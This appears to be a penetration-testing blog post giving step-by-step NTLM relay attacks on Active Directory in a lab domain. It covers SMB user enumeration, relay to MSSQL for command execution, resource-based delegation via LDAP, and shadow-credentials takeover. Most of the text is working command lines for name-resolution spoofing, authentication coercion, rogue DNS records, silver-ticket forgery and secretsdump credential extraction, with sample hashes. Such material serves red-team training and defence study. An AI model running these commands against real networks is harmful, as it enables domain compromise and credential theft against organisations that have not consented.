# Attack 1: Enumerating Domain Usernames via a Non-Admin SMB Relay
Ntlmrelayx : https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py – Multi-function tool that supports listeners and clients for various protocols such as SMB, HTTP, and LDAP. Used to capture and relay NTLM credentials to target systems using multiple application protocols.
Aside from ntlmrelayx, which will be used in every relay attack mentioned in this post, the main tool needed for this technique is the Impacket lookupsid.py script.

To start the attack, launch ntlmrelayx with the “-socks” option to create a SOCKS proxy connection for every successful relay.
    
    ntlmrelayx.py -smb2support -t smb://10.2.10.31 -socks

   
Next, perform whichever name resolution spoofing attack is appropriate for your environment (via Responder or mitm6, for example) and wait for a connection to come in and relay it to the SMB service on the target.

Since we’re using the SOCKS connection established by ntlmrelayx, we’ll execute our lookupsid.py command via proxychains. First, we’ll need to edit the “/etc/proxychains.conf” file and make sure it uses port 1080, which is the default SOCKS port used by ntlmrelayx.

Now we’re ready to  use the lookupsid.py command and enumerate domain users. Note that since we’re leveraging an existing authenticated connection, no password is required for this command.

    proxychains lookupsid.py -no-pass -domain-sids babysteps/user1@10.2.10.31    
    
# Attack 2: Relaying to Microsoft SQL Server
There may be times during an engagement when relaying NTLM credentials to SMB services isn’t successful (i.e., SMB signing may be required throughout the network, or you’re not able to relay any account with local admin privileges and already have a full list of domain usernames). Relaying to Microsoft SQL Server (MSSQL) services is a great alternative that can lead to remote code execution or privilege escalation and tends to get overlooked.

For this type of relay, I recommend utilizing ntlmrelayx’s “-socks” flag or the “-i” flag for “interactive mode”. With interactive mode enabled, you can use a pseudo MSSQL command prompt and execute various commands by utilizing Impacket’s mssqlclient.py.

    # ntlmrelayx.py -smb2support -t mssql://10.2.10.31 -i

After performing a name resolution spoofing attack in a separate terminal, we receive an incoming SMB connection from the “babysteps\domainadmin” user and relay it to the MSSQL service on the target.

Now we can use a tool such as ncat to interact with that MSSQL shell on localhost port 11000. Once connected, we can use the built-in “xp_cmdshell” alias command to enable that stored procedure and execute the “whoami” command on the host.
    
    ncat -n 127.0.0.1 11000 

In the event we don’t have MSSQL sysadmin privileges and can’t run the “xp_cmdshell” stored procedure to execute OS commands, an alternative next step after establishing the MSSQL shell would be to leverage the “xp_dirtree” or “xp_fileexist” stored procedures to initiate a remote connection to an attacker-controlled SMB service. Depending on the user that the MSSQL service is configured to run as, this could result in obtaining an NTLMv2 hash that could be cracked or relayed to another MSSQL or SMB service in the network.



# Attack 3: Relaying to LDAP and Configuring Resource-Based Delegation
In this attack scenario, assume the following conditions are true:

The domain MachineAccountQuota attribute is not at the default value of 10 and/or the SeMachineAccountPrivilege permission is not assigned to the Authenticated Users group, which prevents your ability to add an arbitrary computer object to the domain.
Note on this: If this were not the case, we could execute this entire attack in one ntlmrelayx command via the “–delegate-access” flag, which will attempt to create a new computer account and configure Kerberos Resource-Based Delegation (RBCD) all with a single command. This post I wrote some years back explains this attack in detail—skip down to the Resource-Based Constrained Delegation Section, under “Attack Walkthrough—Scenario 3.”
You previously gained local admin privileges on a domain-joined system and successfully collected LSA secrets, acquiring the NT hash of the computer account in the process.
The goal of this attack is to relay the NTLM credentials of a computer account to the LDAP service on a domain controller and do the following:

Configure Kerberos RBCD by adding our previously compromised computer account to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the relayed computer account.
Obtain a Kerberos Ticket Granting Service (TGS) ticket for a service on the relayed computer account while impersonating a user with local admin privileges.
Use the TGS ticket to gain remote administrative access to the relayed computer.
For more control over exactly what’s happening during this attack, I prefer to use ntlmrelayx’s “interactive mode” as we did before with the MSSQL relay, but this time utilizing LDAP as the protocol. The ntlmrelayx command would be similar to the following:

    ntlmrelayx.py -t ldap://10.2.10.11 -i -6 -wh wpad-lab    

After performing a name resolution spoofing attack in a separate terminal, we receive an incoming HTTP connection from the 10.2.10.21 system and relay the LA-WIN11-22H2-1$ computer account credentials to the LDAP service on 10.2.10.11. Authentication succeeds and an interactive LDAP shell is established on localhost port 11000.

    ntlmrelayx.py -t ldap://10.2.10.11 -i -6 -wh wpad-lab          
    
Next, we interact with the LDAP shell using ncat and list the available commands using the help command.
    
    ncat -n 127.0.0.1 11000
    
    
Assuming that our previously compromised computer account is named LA-SRV01-2019$, we issue the following command to grant that account RBCD privileges over the relayed LA-WIN11-22H1-1$ account:

    set_rbcd LA-WIN11-22H2-1$ LA-SRV01-2019$
    
To move forward with remote code execution and compromising the target system, we’ll use the Impacket getST.py script to obtain a TGS ticket for the WSMAN SPN on behalf of the babysteps\administrator user, which will allow us to connect via WinRM to the target.    
    
    getST.py -impersonate administrator -spn 'WSMAN/LA-WIN11-22H2-1.babysteps.domain' -dc-ip 10.2.10.11 -hashes :62a68d39b231ca68d2f81d8f614c86cc 'babysteps.domain/LA-SRV01-2019$'
    
    
Finally, we configure the KRB5CCNAME environment variable to point to our TGS ticket and utilize evil-winrm to connect to the target as the babysteps\administrator user.    
    
    export KRB5CCNAME=/tmp/administrator@WSMAN_LA-WIN11-22H2-1.babysteps.domain@BABYSTEPS.DOMAIN.ccache 

    evil-winrm -i LA-WIN11-22H2-1.babysteps.domain -r BABYSTEPS.DOMAIN --spn WSMAN 
    
# Attack 4: Shadow Credentials Attack with no Prior Credentials
 
 In this attack, we’ll be using an LDAP NTLM relay for computer account takeover via the “shadow credentials” technique. This involves modifying the computer account’s msDS-KeyCredentialLink attribute and is a great alternative to Kerberos Resource-Based Delegation attacks as it doesn’t require adding a new computer account or compromising an existing one. For more information on how the shadow credentials attack works, refer to this great post by @elad_shamir.

Prerequisites for this attack to succeed:

The environment must have a domain controller running at least Windows Server 2016.
The target Domain Functional Level must be Windows Server 2016 or above.
The domain controller used during the attack must have its own certificate and keys (this condition is met if Active Directory Certificate Services is configured).
Scenario for when this attack would be useful:

You have no credentials for the target domain.
You’re running a tool such as mitm6 or Responder with DHCP spoofing and you identify frequent HTTP authentication attempts from a domain computer account.
Overview of the attack process:

Relay computer account credentials to the LDAP service on a domain controller and update that computer’s msDS-KeyCredentialLink attribute with a unique DeviceID and other data including a public key. As part of this process, the corresponding private key and certificate will be saved to disk on the attacking system.
Use PKINIT authentication to send pre-authentication data (which is encrypted with the private key that was created in the previous step) to the domain controller and obtain a Kerberos Ticket Granting Ticket (TGT) as the relayed computer account.
As a first step, we’ll launch ntlmrelayx with the “–shadow-credentials” option and the “–shadow-target” parameter set to the name of the computer account that we are expecting to relay (in this case, LA-WIN11-22H2-1$).
 
    ntlmrelayx.py --shadow-credentials --shadow-target 'LA-WIN11-22H2-1$' -t ldap://10.2.10.11 --no-acl --no-dump --no-da -wh wpad-lab -6     
 
 
 
 Next, in a separate terminal run mitm6 to perform DHCPv6 poisoning and DNS spoofing.
 
     mitm6 -i eth0 -d babysteps.domain

 
 
 After a brief wait, we receive an HTTP connection from the LA-WIN11-22H2-1$ computer account along with its NTLM credentials. These credentials are then relayed to the LDAP service on the domain controller and the msDS-KeyCredentialLink attribute of the relayed computer account is updated.
 
 
 
 Now we can use the certificate and private key along with PKINIT authentication to obtain a TGT for the LA-WIN11-22H2-1$ computer account. For this step, we’ll utilize @_dirkjan’s : https://github.com/dirkjanm/PKINITtools
 
 
Once you have the TGT of the relayed computer account, there are two options for gaining privileged access to that system:

Use the TGT and the Kerberos S4U2Self process to impersonate a privileged user account to an arbitrary service on the host.
Extract the computer account’s NT hash from the TGT that was obtained and forge a silver ticket to impersonate a privileged user account to an arbitrary service on the host.
I’ll demonstrate the steps for both attack options.

S4U2Self
For this step, we’ll need the gets4uticket.py tool from the same PKINITtools repo where we got the gettgtpkinit.py script. The syntax on the command is a bit complex so just be mindful of all your parameters. The output file, stored as “administrator-cifs.ccache”, will be a CIFS TGS ticket for the administrator@babysteps.domain user to the LA-WIN11-22H2-1$ host.
 
 
 
    python3 ./gets4uticket.py kerberos+ccache://babysteps.domain\\LA-WIN11-22H2-1\$:F0COeLZL.ccache@10.2.10.11 CIFS/LA-WIN11-22H2-1.babysteps.domain@babysteps.domain administrator@babysteps.domain administrator-cifs.ccache
 
 
 
 For the final steps in this attack, we set the KRB5CCNAME environment variable to use the CIFS ticket and then leverage the Impacket secretsdump tool to acquire credentials from the LA-WIN11-22H2-1 system.
 
 
    export KRB5CCNAME=/opt/tools/PKINITtools/administrator-cifs.ccache
 
    klist   
    
    
    
Now that we have the NT hash of the LA-WIN11-22H2-1$ computer account, we can use that as the RC4 encryption key to forge a silver ticket to that system using the Impacket ticketer.py tool.

One of the required details to forge a silver ticket is the SID of the target domain. There are many ways to obtain that value, and, in this example, I’ll use the pywerview tool to grab the SID of the babysteps\administrator account. The SID of the domain itself will be contained within the SID of that account, so it’s a bit of a shortcut to get to the value we need.    
    
        python3 ./pywerview.py get-adobject -d babysteps.domain -u domainuser -p 'password' -t 10.2.10.11 --sam-account-name administrator --attributes objectsid
    
Now we have all the data we need to create the silver ticket. In this example, we’ll create a silver ticket for the CIFS service on behalf of the babysteps\administrator user.

        ticketer.py -domain babysteps.domain -domain-sid S-1-5-21-3396363035-2530258332-185159541 -nthash 1d71869aed329543b37a520096015ee6 -spn cifs/LA-WIN11-22H2
    
    
    
Finally, we’ll set the KRB5CCNAME environment variable and leverage secretsdump to retrieve credentials from LA-WIN11-22H2-1’s registry.


    export KRB5CCNAME=/opt/tools/PKINITtools/administrator.ccache

    klist       

    secretsdump.py -k -no-pass LA-WIN11-22H2-1.babysteps.domain



# Attack 5: Shadow Credentials Attack Using Prior Credentials

This attack is very similar to the previous one with the major difference being that in this scenario, we’ve already compromised at least one domain user or computer credential. This opens up the opportunity for authentication coercion techniques such as PetitPotam,: https://github.com/topotam/PetitPotam  the Printer : https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py Bug, or other Microsoft protocol tricks such as those implemented in the Coercer tool : https://github.com/p0dalirius/Coercer. This has the effect of expanding our NTLM relaying attacks beyond just our local subnet, allowing us to target systems throughout the target environment.

To accomplish this, we’ll rely on abusing the WebClient Service to coerce HTTP authentication from Windows workstations. Note that Server versions of Windows do not have this service installed by default; however, workstation versions such as Windows 10 and 11 do have the service installed.

Here is a high-level overview of how this attack works:

We find a host that has the WebClient service running. This means that we can abuse the service to coerce NTLM authentication from that computer account over the HTTP protocol and relay it to the LDAP service on the domain controller (as opposed to SMB authentication, which cannot be relayed to LDAP).
After the successful relay to LDAP, we will update that computer account’s msDS-KeyCredentialLink attribute with our own DeviceID and public key, saving the private key and certificate file to disk in the process.
Lastly, we can use PKINIT authentication to obtain a TGT for the relayed computer account and use either S4U2Self or a silver ticket to compromise that system.
First, we’ll use the NetExec “webdav” module along with our previously compromised credentials to check if a target system has the WebClient service enabled.

    nxc smb 10.2.10.21 -d babysteps.domain -u domainuser -p 'password' -M webdav


    
Next, we’ll add a DNS record to the domain which points to our attacking Linux system. For this step, I recommend using dnstool.py : https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py from the krbrelayx repo. This DNS record is necessary for the target system to consider our box as belonging to the “Intranet Zone”, which will result in the system sending its NTLM credentials in response to the WebClient authentication coercion attack. If we try the authentication coercion using our IP address instead, we won’t receive any credentials.

    python3 dnstool.py -u 'babysteps.domain\domainuser' -p 'password' -a add -r  attacker -d 10.2.10.1 10.2.10.11 
    
    
Next, we’ll use ntlmrelayx with the appropriate flags related to the shadow credentials attack    


    ntlmrelayx.py -t ldap://10.2.10.11 --shadow-credentials --shadow-target 'LA-WIN11-22H2-1$' --no-validate-privs --no-dump --no-da
    
Then, use Coercer to trigger the HTTP authentication attempt.

    python3 ./Coercer.py coerce --auth-type http -l attacker -t 10.2.10.21 -d babysteps.domain -u domainuser -p 'password' --filter-protocol-name MS-EFS


After the successful authentication coercion, we receive an authenticated HTTP connection from the LA-WIN11-22H2-1$ computer account, relay it to the LDAP service on the domain controller, and modify that computer’s msDS-KeyCredentialLink attribute.

    ntlmrelayx.py -t ldap://10.2.10.11 --shadow-credentials --shadow-target 'LA-WIN11-22H2-1$' --no-validate-privs --no-dump --no-da


    
From here, we can follow the same steps as shown in the previous attack example – either the S4U2Self or silver ticket attack option. To recap, this attack is very similar to the popular Kerberos Resource-Based Delegation attack (as described here and here), but it has the advantage that it does not require creating a new computer account or previously compromising an existing one.




Responder : https://github.com/lgandx/Responder – NBT-NS/LLMNR/mDNS/DHCP spoofer. Used to coerce nearby systems into authenticating to an attacker’s host.

Mitm6 : https://github.com/dirkjanm/mitm6 – IPv6 attack tool. Used to abuse Windows default IPv6 settings and establish an attacker’s system as a target’s primary DNS server.

Coercer : https://github.com/p0dalirius/Coercer – Authentication coercion tool. Used to remotely trigger an authentication attempt from a target system using various Windows protocols.



